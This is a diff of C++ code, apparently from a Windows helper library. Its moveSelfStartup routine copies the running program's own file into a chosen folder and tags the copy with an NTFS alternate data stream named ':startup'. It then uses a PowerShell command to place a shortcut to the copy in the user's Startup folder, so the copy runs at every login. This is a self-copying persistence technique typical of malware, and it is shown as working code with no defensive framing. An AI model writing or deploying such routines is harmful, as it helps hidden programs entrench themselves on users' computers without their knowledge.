@@ -44,12 +44,11 @@ std::string getSelfName() {
 extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
 extern "C" bool __cdecl isStartup() { return (access_(getSelfName() + ":startup")); }
 
-extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//FULL path_
+extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to filder with '/' at the end!)
     std::string self = getSelfName();
     std::string path = gsfcp(path_);
     std::string sName = gsfcp(sName_);
-    if (isStartup()) { return 1; }//The current file is already processed by this code.
-    //std::string pTmp = "C:/Users/" + getUName() + "/AppData/Local/Temp/";
+    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
     std::string pStartup = "C:/Users/" + getUName() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
     std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
     std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd;
